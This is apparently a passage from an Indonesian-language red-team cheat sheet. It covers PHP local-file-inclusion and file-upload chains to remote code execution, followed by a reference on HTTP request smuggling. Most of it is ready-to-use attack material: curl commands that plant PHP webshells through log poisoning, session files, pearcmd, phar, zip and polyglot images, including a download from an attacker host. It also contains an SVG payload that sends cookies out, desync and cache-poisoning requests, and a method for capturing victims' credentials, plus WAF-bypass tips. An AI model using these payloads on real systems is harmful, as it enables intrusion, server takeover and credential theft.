**Muncul:** base64 source (read) atau hasil decode sebagai PHP (exec).
**Kenapa berhasil:** wrapper aktif default, tidak butuh `allow_url_include`. Untuk chain RCE, butuh primitive *write* (file upload, log, session) karena `php://filter` sendiri read-only kecuali pakai `convert.base64-decode` saat file mengandung base64.

```bash
# Read source
curl 'http://t/?f=php://filter/convert.base64-encode/resource=index.php'
curl 'http://t/?f=php://filter/convert.base64-encode/resource=/etc/passwd'

# RCE chain (file berisi base64-PHP di tempat yang bisa ditulis)
# Payload di file: PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+  (base64 dari <?php system($_GET['c']);?>)
curl 'http://t/?f=php://filter/convert.base64-decode/resource=/tmp/evil.txt&c=id'
```

Chain multi-filter (bypass prefix/suffix, PHP >=7):
```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=shell.php
```

---

## 3. data:// dan php://input

**Kirim:** payload langsung di URL/body, di-include.
**Muncul:** eksekusi penuh.
**Kenapa gagal:** `allow_url_include=Off` adalah default sejak PHP 5.2; jarang On.

```bash
curl 'http://t/?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id'
curl -X POST 'http://t/?f=php://input' --data '<?php system("id");?>'
```

---

## 4. Log Poisoning

### 4.1 Apache access.log

**Kirim:** User-Agent berisi PHP saat request apa pun.
**Muncul:** PHP tereksekusi ketika log di-include.
**Path umum:** `/var/log/apache2/access.log`, `/var/log/httpd/access_log`, `/usr/local/apache/log/access_log`.

```bash
curl -A '<?php system($_GET["c"]);?>' 'http://t/'
curl 'http://t/?f=/var/log/apache2/access.log&c=id'
```

Bypass quote/newline di UA:
```bash
curl -A '<?=`$_GET[0]`?>' 'http://t/'
```

### 4.2 SSH auth.log

**Kirim:** username berisi PHP.
**Muncul:** log auth.log memuat payload, di-include via LFI.
**Kenapa gagal:** username di-escape/di-sanitize sshd versi baru; PHP di dalam field non-first-byte sering tidak ter-parse (harus awal baris).

```bash
ssh '<?php system($_GET["c"]);?>'@target
curl 'http://t/?f=/var/log/auth.log&c=id'
```

### 4.3 nginx access.log

Format nginx escaping `$http_user_agent` menulis `\x22` untuk `"`, tapi `<`, `?` tetap → payload `<?=` lolos.
```bash
curl -A '<?=`id`?>' 'http://t/'
curl 'http://t/?f=/var/log/nginx/access.log'
```

### 4.4 php-fpm/error log — `PHP_VALUE` di .user.ini (lihat §9)

---

## 5. /proc/self/environ

**Kirim:** PHP di User-Agent (atau header lain yang jadi env).
**Muncul:** RCE bila env readable dan log/env baru tidak hilang.
**Kenapa gagal (umum):** kernel ≥5.x modern, minimal env, container sering kosong; cek dulu:

```bash
curl 'http://t/?f=/proc/self/environ' | head -c 400
curl -A '<?php system($_GET["c"]);?>' 'http://t/?f=/proc/self/environ&c=id'
```

Alternatif terkait: `/proc/self/fd/{0,1,2}` untuk pipe Apache — hanya reliable bila log access terhubung ke fd.

---

## 6. Session File

**Kirim:** PHP di nilai session (`$_SESSION`).
**Muncul:** RCE saat file `/tmp/sess_<id>` di-include.
**Path default:** `/var/lib/php/sessions/sess_<PHPSESSID>`, `/tmp/sess_*`.
**Kenapa gagal:** session file sering di-cleanup cepat; cookie harus valid; session value kadang di-serialize.

```bash
# Primitive: endpoint yang menyimpan user input ke $_SESSION (nama, bio, csrf, locale)
curl -c cj -b cj 'http://t/login.php' -d 'user=<?php system($_GET["c"]);?>'
curl -b 'PHPSESSID=<id>' 'http://t/?f=/var/lib/php/sessions/sess_<id>&c=id'
```

Session dir listing (bila LFI bisa `glob` via `php://filter` chain atau side-channel mtime) → brute mtime untuk id.

---

## 7. pearcmd.php

**Kirim:** LFI ke `pearcmd.php` dengan `+config-create` atau `+download`.
**Muncul:** file PHP tertulis ke disk → include.
**Prasyarat:** PHP dari paket `php-pear`/distro Debian-Ubuntu, `register_argc_argv=On` (default On di CLI, **Off** di php-fpm sering), path `pearcmd.php` readable.

```bash
# Write webshell ke /tmp/shell.php
curl 'http://t/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET[c])?>+/tmp/shell.php'
curl 'http://t/?f=/tmp/shell.php&c=id'

# Via download (butuh outbound)
curl 'http://t/?+download+http://attacker/shell.php+/tmp/shell.php&file=/usr/local/lib/php/pearcmd.php'
```

Lokasi `pearcmd.php`:
```
/usr/local/lib/php/pearcmd.php
/usr/share/php/pearcmd.php
/usr/share/php/PEAR/pearcmd.php
```

---

## 8. zip:// dan phar://

### 8.1 zip://

**Kirim:** ZIP berisi shell.php, diupload, di-include via `zip://`.
**Muncul:** eksekusi member.
**Kenapa gagal:** tidak butuh ext zip ter-enable untuk `zip://` (built-in), tapi file harus tersimpan di path yang diketahui.

```bash
zip shell.zip shell.php
curl -F 'file=@shell.zip' 'http://t/upload.php'
curl 'http://t/?f=zip:///var/www/upload/shell.zip%23shell.php'
# %23 = '#'
```

### 8.2 phar://

**Kirim:** file phar (gambar/manifest) dengan metadata object gadget → deserialization saat `file_exists`/`file_get_contents` dipanggil pada path `phar://`.
**Muncul:** object injection → RCE via gadget chain (Monolog, Guzzle, Laravel, dsb).
**Kenapa gagal:** PHP 8.0+ tidak auto-deserialize metadata pada file operation biasa; butuh `phar.readonly=0` saat membuat, dan file phar harus valid (`__HALT_COMPILER()`).

```bash
# Buat phar
php -d phar.readonly=0 -r '
$p = new Phar("evil.phar");
$p->startBuffering();
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$o = new SomeGadget(...); // sesuaikan chain
$p->setMetadata($o);
$p->addFromString("x", "y");
$p->stopBuffering();
'
mv evil.phar evil.gif
curl -F 'file=@evil.gif;type=image/gif' 'http://t/upload.php'
curl 'http://t/?f=phar:///var/www/upload/evil.gif'
```

Stub GIF agar magic bytes `GIF89a` valid.

---

## 9. Upload Bypass

### 9.1 Double extension

| Server | Contoh nama | Efek |
|---|---|---|
| Apache multi-ext | `shell.php.jpg` | `AddHandler` lama eksekusi `.php` |
| Apache + `mod_mime` | `shell.php.jpg` | Bila `.php` handler terdaftar |
| IIS 7 | `shell.asp;.jpg` | Exec `asp` |
| Nginx+php-fpm | `shell.jpg` | Gagal kecuali `cgi.fix_pathinfo` (lihat 9.3) |

```bash
curl -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg' 'http://t/upload.php'
```

### 9.2 .htaccess

**Kirim:** upload `.htaccess` untuk menambah handler.
**Muncul:** upload berikutnya (`shell.gif`) dieksekusi sebagai PHP.
**Prasyarat:** Apache, `AllowOverride All`, folder writable, upload tidak memblokir dotfile.

```apache
AddType application/x-httpd-php .gif
# atau
AddHandler application/x-httpd-php .gif
php_value auto_append_file /tmp/shell.php
```

```bash
curl -F 'file=@.htaccess;filename=.htaccess' 'http://t/upload.php'
curl -F 'file=@shell.gif' 'http://t/upload.php'
curl 'http://t/upload/shell.gif?c=id'
```

### 9.3 Content-Type / magic bytes / polyglot

| Kontrol | Bypass | Catatan |
|---|---|---|
| MIME type | `Content-Type: image/jpeg` di multipart | Server sering hanya cek header |
| Magic bytes `GIF8` | prefix `GIF89a;` di shell | `GIF89a<?php system($_GET[c]);?>` |
| getimagesize() | GIF polyglot valid | Butuh minimal header GIF |
| `exif_imagetype()` | PNG header 8 byte + PHP di tEXt | Chrome 131 tidak relevan; server PHP yang cek |
| `finfo` | Polyglot penuh | Sulit, sering butuh valid image + PHP di comment |

GIF/PHP polyglot:
```bash
printf 'GIF89a;\n<?php system($_GET["c"]);?>' > shell.gif
curl -F 'file=@shell.gif;type=image/gif' 'http://t/upload.php'
curl 'http://t/upload/shell.gif?c=id'
```

JPEG/PHP (EXIF comment):
```bash
exiftool -Comment='<?php system($_GET["c"]);?>' shell.jpg
exiftool -Comment='<?=`id`?>' shell.jpg
```

SVG XSS (bila SVG dirender langsung, bukan dieksekusi PHP):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//attacker/'+document.cookie)"/>
```
Content-Type `image/svg+xml` → Chrome 131 eksekusi JS di origin upload bila tanpa `Content-Disposition: attachment`.

### 9.4 Zip Slip

**Kirim:** ZIP dengan entry path traversal `../../var/www/shell.php`.
**Muncul:** ekstraksi menulis ke luar direktori target → drop shell di webroot.
**Prasyarat:** ekstraksi server-side tanpa normalisasi path; Java `ZipInputStream`, Python `zipfile` <3.6.2 rentan; PHP `ZipArchive::extractTo` normalisasi tapi traversal lewat symlink entry bisa.

```python
import zipfile
z = zipfile.ZipFile("evil.zip","w")
z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['c']);?>")
z.write("safe.txt")
z.close()
```

```bash
curl -F 'file=@evil.zip' 'http://t/upload.php?extract=1'
curl 'http://t/shell.php?c=id'
```

### 9.5 nginx + php-fpm `cgi.fix_pathinfo`

**Kirim:** upload `shell.jpg` berisi PHP, akses via `/shell.jpg/x.php`.
**Muncul:** php-fpm mengeksekusi `shell.jpg` sebagai skrip.
**Kenapa gagal:** default `cgi.fix_pathinfo=0` di distro modern (Debian sejak PHP 5.3.9); nginx butuh `location ~ \.php$` + try_files.

```bash
curl -F 'file=@shell.jpg;type=image/jpeg' 'http://t/upload.php'
curl 'http://t/upload/shell.jpg/x.php?c=id'
```

`/etc/nginx/sites-enabled/default` rentan:
```nginx
location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
# fix: fastcgi_split_path_info ^(.+\.php)(/.+)$; + try_files $fastcgi_script_name =404;
```

### 9.6 PHP `user.ini`

**Kirim:** upload `.user.ini` di folder yang sama dengan target.
**Muncul:** set `auto_prepend_file` → eksekusi di setiap PHP di folder itu.
**Prasyarat:** php-fpm/php-cgi dengan `user_ini.filename=.user.ini` (default) dan `user_ini.cache_ttl` >0; butuh akses ke PHP valid di folder.

```ini
auto_prepend_file=/tmp/shell.php
```

```bash
curl -F 'file=@.user.ini;filename=.user.ini' 'http://t/upload.php'
curl 'http://t/upload/index.php'   # index.php lokal memicu prepend
```

---

## 10. Diagram Keputusan

```
LFI ada?
├─ allow_url_include=On → data:// / php://input
├─ write primitive?
│  ├─ upload → zip:// | phar:// (gadget) | upload→RCE
│  ├─ log write (UA/SSH) → log poisoning
│  └─ session write → /var/lib/php/sessions/sess_*
├─ read-only saja?
│  ├─ pearcmd.php ada → +config-create
│  ├─ /proc/self/environ readable → UA poison
│  └─ tidak ada → php://filter read + credential harvest
Upload ada?
├─ Apache + .htaccess → handler override
├─ nginx+fpm cgi.fix_pathinfo=1 → shell.jpg/x.php
├─ MIME/magic cek → polyglot GIF/JPEG/SVG
├─ ZIP ekstraktor → Zip Slip
└─ phar writable → metadata deserialize
```

---

## 11. Versi / Perilaku Default yang Sering Menentukan

| Produk | Default | Dampak |
|---|---|---|
| PHP 8.0+ | `allow_url_include=Off`, `phar.readonly=1` (dev), metadata phar tidak auto-deserialize | data:// dan phar gadget lebih sulit |
| PHP 5.2–7.4 | `allow_url_include=Off` (5.2+) | data:// butuh enable eksplisit |
| Debian/Ubuntu `php-fpm` | `register_argc_argv=Off`, `cgi.fix_pathinfo=0` | pearcmd & fix_pathinfo gagal |
| Debian/Ubuntu `php-cli` | `register_argc_argv=On` | pearcmd jalan hanya bila reachable via include |
| Apache httpd 2.4 | `.htaccess` butuh `AllowOverride All`; multi-ext `.php.jpg` tidak exec default | upload bypass butuh AddHandler |
| nginx 1.25 | tidak parse `.htaccess`; `location ~ \.php$` + try_files | fix_pathinfo butuh misconfig |
| php-fpm 8.3 | `user_ini.filename=.user.ini` | `.user.ini` prepend jalan |
| Linux kernel 5.x/6.x | `/proc/self/environ` minimal di service manager | UA poison environ sering kosong |
| Chrome 131 | SVG `image/svg+xml` inline JS jalan; `Content-Disposition: attachment` blokir | SVG XSS butuh header salah |
| Windows IIS 10 (Win11 24H2) | double-ext `asp;.jpg` tidak lagi dieksekusi default | butuh `.config` override |

---

## 12. Jebakan Operasional

1. **`allow_url_include` sudah Off sejak PHP 5.2** — jangan rancang chain di data:///php://input tanpa verifikasi `phpinfo` atau `ini_get`. Di PHP 8.x modern praktis mati.
2. **`register_argc_argv=Off` di php-fpm Debian** — pearcmd gagal diam-diam; `$_SERVER['argv']` kosong sehingga `+config-create+` di-argumen URL tidak ter-parse. Cek mode: CLI vs FPM.
3. **php-fpm `cgi.fix_pathinfo=0` default** — teknik `shell.jpg/x.php` mati di distro modern. Butuh konfigurasi nginx salah + flag On.
4. **`/proc/self/environ` kosong** di service manager modern (systemd menghapus env). UA poisoning environ hanya historis (kernel <4.x / php-fpm tanpa clean env).
5. **Session directory beda** — `/var/lib/php/sessions` vs `/tmp` vs `[session.save_path]`. UID web bisa saja tak bisa baca. Cek `phpinfo` atau `included_files`.
6. **Session cleanup** — `session.gc_maxlifetime=1440` (24 menit) default; shell di session bisa hilang sebelum di-include.
7. **Log rotation** — access.log di-rotate; payload di file lama atau rotasi baru. Include file log tertua sering zero.
8. **Apache log escaping** — `CustomLog` tanpa escaping quote; `%{User-Agent}i` berisi newline memecah log dan bisa merusak payload. nginx escape `\x22` untuk `"` — pakai `<?=` tanpa quote.
9. **`phar.readonly=1`** — tidak bisa membuat phar di server target; harus buat di lokal dengan `-d phar.readonly=0`, kirim sebagai file biasa. PHP 8.0+ butuh file operation pertama pada `phar://` benar-benar valid + butuh gadget autoload.
10. **`zip://` butuh path absolut** dan `#` di-URL-encode `%23`. Banyak filter LFI memblok `zip://` di prefix — pakai filter chain atau `php://filter/...resource=zip://...`.
11. **Magic bytes vs `getimagesize` vs `finfo`** — tiga cek beda. `GIF89a;` lolos `finfo`? Tidak. Butuh polyglot valid + PHP di area yang tidak merusak struktur (comment/tEXt).
12. **`exif_imagetype` strict** — hanya cek 8 byte pertama; `GIF89a<?php ...` lolos `exif` tapi gagal bila aplikasi render via GD (`imagecreatefromgif` akan error). Shell tetap jalan bila diakses langsung.
13. **Upload MIME via `Content-Type`** — hanya berguna bila server membaca header, bukan `finfo_file`. Chrome 131 set MIME dari ekstensi, jadi browser bisa memaksa `image/gif` walau nama `shell.php` (tapi server sering override dari filename).
14. **`.htaccess` tidak berlaku di nginx** — jangan kirim `.htaccess` ke target nginx; gunakan `.user.ini` atau fix_pathinfo.
15. **`user_ini.cache_ttl`** default 300 detik — perubahan `.user.ini` baru berlaku setelah TTL; racing dengan cleanup.
16. **`.user.ini` di root web** bisa sudah ada dan menolak, atau `open_basedir` memblok prepend path.
17. **Zip Slip di ZipArchive PHP** — `extractTo` **menormalkan** `../` sejak PHP 5.2.7; Zip Slip via PHP jarang; target adalah Java `java.util.zip.ZipInputStream`, Python `zipfile` <3.6.2, Node `unzipper` lama, Go `archive/zip` tanpa sanitasi.
18. **Symlink entry di zip** — `ZipArchive::extractTo` membuat symlink (bila ext symlink aktif); chain symlink menuju webroot bisa efektif meski `../` diblok.
19. **Ekstensi gambar di-rewrite** — upload server ganti nama `shell.gif` → `shell_12345.gif`; path harus di-enumerate (mtime, sequential ID, response Location).
20. **Perbedaan `include` vs `require` vs `require_once`** — `require_once` pada path yang sama meng-cache; shell kedua butuh path unik (`?a`, symlink, hardlink).
21. **`open_basedir`** memblok `/etc/passwd`, `/proc/self/environ`, log — semua chain LFI mati; cek `phpinfo`/error. Bypass butuh bug lain (glob://, syscalls).
22. **`disable_functions`** (umum di shared hosting: `system,exec,shell_exec,passthru,popen,proc_open`) — shell masih include tapi eksekusi mati; pakai `pcntl_exec`, FFI, `LD_PRELOAD` via `mail()`/`putenv` (butuh `sendmail_path` writable).
23. **php-fpm `security.limit_extensions`** default `.php` — SCRIPT_FILENAME ke `.jpg` ditolak walau `fix_pathinfo` On. Bypass bukan via fix_pathinfo.
24. **php-fpm chroot / `chdir`** — path absolut di `phar://` dan `zip://` bisa tak resolve sama seperti di PHP include biasa.
25. **Log poison + CRLF** — banyak WAF memblok newline di UA; pakai single-line `<?=` tanpa `?>` untuk hindari kebutuhan newline.
26. **ModSecurity CRS** — rule 932xxx memblok `php://`, `data://`, `phar://`, `zip://` di parameter; encoding ganda `%25%70%68%70` atau case `PHP://` kadang lolos (bukan jaminan).
27. **Container/devcontainer** — `/var/log/*` sering di-stdout (docker json-file), file log tidak ada. php-fpm di container tanpa log file → log poisoning mati.
28. **SELinux/AppArmor** — `httpd_t` tidak baca `/var/log/auth.log`, `/proc/self/environ` di beberapa distro (Fedora 40, Ubuntu 24.04 default enforce).
29. **Windows path** — LFI di Windows: `C:\Windows\win.ini`, `C:\inetpub\logs\LogFiles\W3SVC1\`, `\\?\` prefix; double-extension `asp;.jpg` tidak lagi exec di IIS 10 default.
30. **`session.upload_progress`** — bisa jadi write primitive sesi tanpa endpoint aplikasi (`PHP_SESSION_UPLOAD_PROGRESS` di multipart); tetap butuh LFI + id sesi yang bisa ditebak/di-set.
31. **`phar` stub harus `__HALT_COMPILER(); ?>` sebagai token literal** — salah format → file bukan phar; error `phar error: invalid url or non-existent`.
32. **Polyglot GIF valid harus punya trailer `;`** — `GIF89a;` adalah header minimal; GD `imagecreatefromgif` bisa menolak bila tanpa image descriptor; gunakan GIF 1×1 valid + PHP di comment extension.
33. **Upload name normalisasi** — `shell.php.jpg` → `shell.jpg` (beberapa framework); `.htaccess` → `.htaccess.txt` (framework anti-dotfile). Cek konvensi penyimpanan dulu.
34. **Race upload→include** — file dihapus setelah diproses (thumbnailing queue), shell harus accessible di jendela singkat; gunakan endpoint render/convert yang mengeksekusi, atau upload ke path publik permanen.
35. **`php://filter` chain panjang** — PHP punya batas panjang wrapper (~4096) dan `iconv` bisa gagal di locale tertentu; uji di PHP versi target, jangan asumsikan 8.3 = 7.4.


## smuggling

# smuggling — web

# HTTP Request Smuggling — Referensi Red Team

## 1. Tabel Cepat Vektor & Target

| Vektor | Frontend rentan | Backend rentan | Dampak utama |
|---|---|---|---|
| CL.TE | nginx ≤1.25.2 (rev proxy), HAProxy ≤2.8 | Node/Express, Gunicorn | Auth bypass, cache poison |
| TE.CL | Varnish 6.x, AWS ALB (beberapa config) | IIS 10, Tomcat 9 | Cache poison, capture kredensial |
| TE.TE obfuscation | Semua yang tidak normalize header | Semua | Bypass mitigasi |
| H2.CL / H2.TE | Envoy <1.27, Cloudflare (historically) | Backend HTTP/1.1 | Downgrade desync |
| Browser-powered | Chrome 131 / Firefox 133 | CDN + backend | Client-side desync, cache poison |

## 2. Deteksi Timing — CL.TE vs TE.CL

Fundamental: kirim request yang jika di-parse TE, backend menunggu sisa body yang tidak dikirim; jika di-parse CL, backend selesai. Selisih waktu = sinyal.

### 2.1 CL.TE Probe (frontend pakai CL, backend pakai TE)

Kirim (raw TCP — `nc`, `openssl s_client`, atau `socat`):

```
POST / HTTP/1.1
Host: target.local
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Yang muncul:** jika CL.TE → backend melihat chunk terakhir `0\r\n\r\n`, lalu `X` dianggap awal request berikutnya → backend menunggu timeout / header berikutnya. Frontend mengira body 6 byte (`0\r\n\r\nX`) selesai. Jika respons hang >5 detik → kemungkinan CL.TE.

**Kenapa gagal:** jika frontend juga menormalkan TE (atau menolak keduanya), tidak ada hang.

Versi aman tanpa hang permanen (pakai timeout 10s):

```bash
printf 'POST / HTTP/1.1\r\nHost: t.local\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | timeout 10 nc -w 10 t.local 80 | xxd | head
```

### 2.2 TE.CL Probe (frontend pakai TE, backend pakai CL)

```
POST / HTTP/1.1
Host: target.local
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.local
Content-Length: 15

x=1
0


```

**Yang muncul:** frontend TE mem-parse chunk `5c` (92 byte) = request kedua `GPOST…` dianggap bagian body yang dikirim. Backend CL=4 hanya membaca `5c\r\n`. Jika frontend menunggu → hang. Jika backend saja (yang CL) yang konsumsi → request ke-2 jadi prefix `/` berikutnya di conn pool.

### 2.3 Kalibrasi delay

- Normal RTT baseline (3 request): catat p50.
- Probe timing: jika delta > 3× p50 → kandidat kuat.
- **False positive** umum: keep-alive idle timeout backend, WAF rate-limit, CDN retry. Selalu probe 5× dengan payload byte-identik dan variasi `Host`/status endpoint.

## 3. Obfuscasi TE (bypass mitigasi WAF/normalizer)

Tabel payload header test. Kirim satu per satu, catat apakah request berikutnya di conn terlihat sebagai method `GPOST`/`POST` ganda, atau 400.

| # | Header | Efek parser |
|---|---|---|
| 1 | `Transfer-Encoding: chunked` | baseline |
| 2 | `Transfer-Encoding : chunked` (spasi sebelum colon) | nginx <1.21 tolak; sebagian proxy lolos; backend SPEC parser terima |
| 3 | `Transfer-Encoding:\tchunked` (tab) | RFC 7230 §3.2.4 harus toleran; banyak proxy tidak |
| 4 | `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | frontend pakai TE pertama, backend pakai TERAKHIR (atau reverse) |
| 5 | `Transfer-encoding: xchunked` | beberapa nodejs `http-parser` treat sebagai chunked |
| 6 | `Transfer-Encoding: chunked, identity` | jika parser split-comma, ambiguity |
| 7 | `Transfer-Encoding: chunked\r\nContent-Length: 6` (duplikat CL di bawah) | CL.TE fallback |
| 8 | `Transfer-Encoding: chunked` + `Transfer-Encoding: chunked` | sebagian backend merge → error, sebagian reverse |
| 9 | `Transfer-Encoding: x` (invalid token) + `Content-Length` | backend ignore TE → CL.TE downgrade |
| 10 | `X-Forwarded-...`-style header tidak relevan | deteksi header passthrough (bukan TE, tapi sinyal CVE) |

Raw example untuk #4 (duplikat TE):

```
POST / HTTP/1.1
Host: t.local
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: identity

5c
GPOST / HTTP/1.1
Host: t.local
Content-Length: 15

x=1
0


```

**Kenapa berhasil:** perbedaan SPEC mutation — RFC 7230 mewajibkan menolak jika CL+TE bersamaan, tapi banyak impl (Node ≤18 `http-parser`, Django `HttpRequest`, Golang `net/http` <1.20) memilih salah satu diam-diam.

## 4. H2.CL & H2.TE — Downgrade

Skenario: klien HTTP/2 ke CDN/edge (nginx 1.25 `http2` on, Envoy 1.27, Cloudflare). Edge menerjemahkan ke HTTP/1.1 ke origin, tapi **meng-copy header `content-length` atau `transfer-encoding` dari frame H2** (pseudo-header `content-length` di H2 legal; `transfer-encoding` **dilarang** oleh RFC 9113 §8.2.2 tapi banyak edge tidak menolak).

### 4.1 H2.CL

Kirim via klien H2 (curl `--http2-prior-knowledge` ke port H2C, atau nghttp2 `nghttp`):

```
:method: POST
:path: /
:scheme: https
:authority: target.local
content-length: 0
transfer-encoding: chunked                ← dilarang, harus ditolak edge

<body: "POST /admin HTTP/1.1\r\nHost: t.local\r\nContent-Length: 10\r\n\r\nx=1">
```

**Yang muncul:** edge menerjemahkan ke H1 dengan `Content-Length: 0` + `Transfer-Encoding: chunked` — kandidat TE.CL/CL.TE di origin. Atau edge forward TE dan origin men-desync.

**Kenapa gagal:** Envoy ≥1.27 dan nginx ≥1.25.3 menolak `transfer-encoding` di H2 (RST_STREAM PROTOCOL_ERROR). Cek versi via banner: `curl -sI --http2 https://t.local | grep -E 'server|alt-svc'`.

### 4.2 H2.TE

Sama tapi tanpa `content-length`, hanya `transfer-encoding: chunked` yang di-copy edge ke origin. Origin memproses chunk, tapi framing H2 yang dipakai edge untuk batas message berbeda → trailing bytes jadi prefix request berikut.

Deteksi cepat:

```bash
# H2C prior knowledge probe
nghttp -nv -H ':method: POST' -H 'content-length: 0' -H 'transfer-encoding: chunked' \
  -d 'POST /x HTTP/1.1\r\nHost: t\r\nContent-Length: 3\r\n\r\nabc' \
  http://t.local/
```

## 5. Request Tunnelling vs Desync

| Aspek | Request Tunnelling | Desync |
|---|---|---|
| Mekanisme | Satu request membawa request lain di *body-nya* melewati frontend yang tidak mem-parse body | Perbedaan framing membuat byte sisa request masuk ke **request berikutnya** di conn pool |
| Prasyarat | Frontend tidak memvalidasi body; backend mem-parse | Frontend & backend punya framing berbeda (CL vs TE) |
| Contoh | nginx `proxy_pass` non-buffered ke app yang reverse-proxy lagi | CL.TE klasik |
| Efek samping | Terbatas pada backend target | **Bocor ke user lain** (conn pooling) |
| Deteksi | Body yang diteruskan utuh | Response delay, request ke-2 muncul tidak diharapkan |

Contoh request tunnelling ke backend internal:

```
POST /proxy HTTP/1.1
Host: t.local
Content-Length: 62
Connection: keep-alive

GET /admin/internal HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
X-Internal: true
```

Jika frontend `proxy_pass http://backend; proxy_pass_request_body on;` tanpa validasi, backend kadang men-parse body sebagai request bila `ProxyRequests On` (Apache mod_proxy salah config).

## 6. Browser-Powered Desync (Client-Side Desync)

Chrome 131 / Firefox 133 — tanpa proxy MITM, cukup browser korban membuka halaman yang dikontrol attacker.

**Prasyarat:** target tidak menutup koneksi setelah response non-2xx (no `Connection: close`), dan browser mempertahankan conn untuk request berikutnya ke origin yang sama.

Payload di halaman attacker (fetch ke target):

```html
<script>
fetch('https://target.local/', {
  method: 'POST',
  mode: 'no-cors',
  body: "GET /admin/ HTTP/1.1\r\nHost: target.local\r\nX-Injected: 1\r\n\r\n",
  headers: {'Content-Length': '0', 'Transfer-Encoding': 'chunked'}
});
setTimeout(()=>fetch('https://target.local/next').then(r=>r.text()).then(console.log), 500);
</script>
```

**Batasan (Chrome 131):** `fetch` memblokir header `Transfer-Encoding` (forbidden header). Workaround memakai `XMLHttpRequest` juga sudah di-patch sejak Chrome 117 untuk CORS-safe headers, **tapi** teknik tetap jalan via request non-simple dengan body `FormData` dan server yang salah klasifikasi framing. **Firefox 133** masih lebih permisif via `fetch` non-CORS ke endpoint yang me-reflect method.

**Teknik alternatif yang masih bekerja (2024-2025):** csd via `<form enctype="text/plain">` dengan method `POST` ke target, konten form yang membentuk prefix request:

```html
<form id="f" method="POST" action="https://target.local/" enctype="text/plain">
  <input name='x' value='GET /admin HTTP/1.1
Host: target.local
X-Injected: 1

' />
</form>
<script>f.submit()</script>
```

Yang dikirim: browser menambahkan `Content-Length` normal, tapi body `x=GET /admin…` tetap mem-prefix di conn pool jika target men-reflect/menunda.

## 7. Dampak Praktis

### 7.1 Cache Poisoning

Request smuggling CL.TE ke edge cache (Cloudflare, Varnish 6.0.13, Akamai) → response terhadap `/static/x.js` berisi response dari `/admin`. Payload:

```
POST /static/x.js HTTP/1.1
Host: t.local
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: t.local
X-Forwarded-Host: attacker.com
```

Korban berikutnya GET `/static/x.js` menerima cache entry berisi response attacker (mis. 302 ke attacker.com, atau eksfil kredensial via form-action).

### 7.2 Auth Bypass (internal endpoint)

Kalau backend punya route `GET /admin` yang mengecek header `X-Forwarded-For` atau `Authorization`, kirim via smuggling ke route yang tidak di-auth frontend:

```
0

GET /admin/delete?user=victim HTTP/1.1
Host: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Auth-Internal: true

```

Frontend tidak lihat `/admin` (hanya `/upload` sebagai endpoint publik), backend memproses `/admin` karena request ke-2 muncul di conn dari frontend.

### 7.3 Capture Request Korban

Backend Node/Express dengan conn pooling menaruh body request korban ke prefix desync. Setelah mengirim prefix CL.TE, request korban yang kebetulan masuk ke conn tersebut **di-prefix** oleh payload kita — artinya attacker menerima request headers+body korban sebagai bagian dari "body" response yang dikirim ke attacker. Metode eksfiltrasi: kirim prefix yang mengarahkan request korban ke endpoint yang men-echo request body ke response yang dikendalikan attacker (mis. `/login` POST dengan `next=` attacker). Request korban yang di-capture:

```
POST /login HTTP/1.1
Host: t.local
Cookie: session=VICTIM_SESSION

username=victim&password=V1ct1m!
```

Karena prefix kita sudah menyuruh backend untuk menganggap POST berikutnya sebagai bagian dari endpoint echo, `VICTIM_SESSION` dan kredensial plaintext bocor.

## 8. Jebakan Operasional (lapangan)

1. **Keep-alive pool reuse rate rendah.** Di nginx 1.25 default `keepalive 32` upstream — kadang butuh 10–50 request bombing paralel sebelum conn pool bocor. Skrip PoC harus multi-thread (≥16) dan pakai `Connection: keep-alive` **eksplisit** di frontend.
2. **HTTP/2 vs HTTP/1 ke frontend.** nginx 1.25 `http2` dengan `proxy_http_version 1.1` → CL.TE klasik gagal, gunakan H2.CL. Cek ALPN: `openssl s_client -alpn h2 -connect t.local:443`.
3. **WAF memaksa `Connection: close`.** Cloudflare Free me-reset conn antar request → desync tidak terjadi. Bypass: pakai path `/cdn-cgi/` yang bypass WAF, atau endpoint yang memicu backend same-conn (mis. WebSocket upgrade handshake).
4. **Frontend menormalkan TE lebih cepat dari TLS.** AWS ALB (2024) menolak duplikat TE di level listener → cek dengan `curl -sv` dan inspeksi response 400 mentah.
5. **Backend Go `net/http` ≥1.20** sudah menolak CL+TE bersamaan (CVE-2022-41717 fix) — CL.TE gagal pada target Go. Cek `Server: Go-http` + versi via error page.
6. **IIS 10 tidak mem-parse chunked dengan benar setelah TLS offload** — perlu raw port 80 di origin, sering unreachable dari luar.
7. **Timing probe terpengaruh keep-alive idle timeout** di CDN (Cloudflare 15s, Fastly 60s) → false positive jika delta < 5s. Kalibrasi baseline per-path.
8. **Response body kosong pada error 400** membuat deteksi visual mustahil — andalkan log backend (jika red team punya akses observability) atau delta ukuran response via `curl -w %{size_download}`.
9. **`Transfer-Encoding: xchunked`** hanya efektif pada Node `http-parser` ≤ Node 12 / `llhttp` mode lenient. Node ≥18.0 menolak token invalid.
10. **Browser desync di Chrome 131** diblokir untuk `Transfer-Encoding`; pakai teknik `enctype=text/plain` form, bukan `fetch`. Firefox 133 masih permisif untuk kasus tertentu tapi ada limit CORS preflight.
11. **Cache poisoning butuh header response unik** — kalau edge cache key include `Cookie`, poison tidak menyebar; uji dengan dua sesi anonim berbeda.
